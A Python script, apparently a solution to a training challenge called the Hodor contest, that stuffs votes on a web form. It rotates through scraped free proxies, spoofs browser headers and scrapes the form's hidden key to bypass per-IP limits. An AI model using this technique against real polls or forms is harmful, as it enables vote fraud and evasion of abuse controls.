#!/usr/bin/python3
""" Voting 1024 times in Hodor contest """
import requests
from bs4 import BeautifulSoup


ID = 3393
url = "http://158.69.76.135/level4.php"
ip_direction = "http://158.69.76.135"

proxy = {
    "http": ""
}
directory = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': ''
}
User_Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit"
User_Agent += "/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
If_none_match = "oun53Fx3Gv2rMXFKHCOgbD2hEes="
header = {
    'User-Agent': User_Agent,
    'If-None-Match': If_none_match,
    'referer': url
}
proxi_sites = ["https://www.us-proxy.org/", "https://free-proxy-list.net/"]


def current_vote():
    """[Returns the actual number of votes to a gived ID]

    Args:
        ID ([int]): [ID To look for]

    Returns:
        [int]: [# Votes related]
    """
    response = requests.get(url, headers=header)
    soup = BeautifulSoup(response.text, "html.parser")
    td_elements = list(soup.find_all('td'))
    position = 0
    for index, el in enumerate(td_elements):
        if "id" not in str(el) and "#" not in str(el):
            if int(str(el).split(" ")[0][4:]) == ID:
                position = index + 1
    return 0 if position == 0 else int(str(td_elements[position]).
                                       split(" ")[0][4:])


if __name__ == '__main__':
    counter = 0
    proxy_index = 0
    desired = 98
    while current_vote() < desired:
        session = requests.Session()
        response = session.get(proxi_sites[proxy_index])
        proxy_index ^= 1

        soup = BeautifulSoup(response.text, "html.parser")
        extern_proxis = soup.find("tbody").find_all("tr")
        for el in extern_proxis:
            proxy["http"] = "http://" + el.find("td").text
            print(f"Trying : {proxy['http']}")
            try:
                response = session.get(url, headers=header,
                                       proxies=proxy, timeout=5)
                soup = BeautifulSoup(response.text, "html.parser")
                form = soup.form
                input = form.find("input", {"name": "key"})
                key = input["value"]
                directory['key'] = key
            except:
                pass
            try:
                obj = session.post(url, headers=header, data=directory,
                                   proxies=proxy, timeout=5)
                status_code = obj.status_code
                print(status_code)
            except:
                status_code = 200
                print(status_code)
            if status_code != 200:
                current = current_vote()
                if (current == desired - 1):
                    break
            else:
                pass
